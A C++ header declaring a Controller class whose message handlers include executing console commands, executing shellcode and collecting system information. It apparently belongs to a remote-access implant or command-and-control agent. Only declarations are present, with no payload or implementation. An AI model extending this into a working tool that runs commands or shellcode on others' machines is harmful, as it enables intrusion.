#ifndef CONTROLLER_H
#define CONTROLLER_H


#include "MessageTypes.h"
#include "MessageHandler.h"



class Controller
{
public:
	Controller(MessageHandler* messageHandler);
	Controller(MessageHandler* messageHandler, ApiManager* apiManager);
	void handleDefault(const InternalMessage& msg);
	void handleNone(const InternalMessage& msg);

	// TODO: rename to handleExecuteConsoleCommand? 
	void handleExecuteCommand(const InternalMessage& msg);

	void handleExecuteShellcode(const InternalMessage& msg);

	void handleSystemInfo(const InternalMessage& msg);
private:
	MessageHandler* messageHandler_;
	ApiManager* apiManager_;

};

#endif
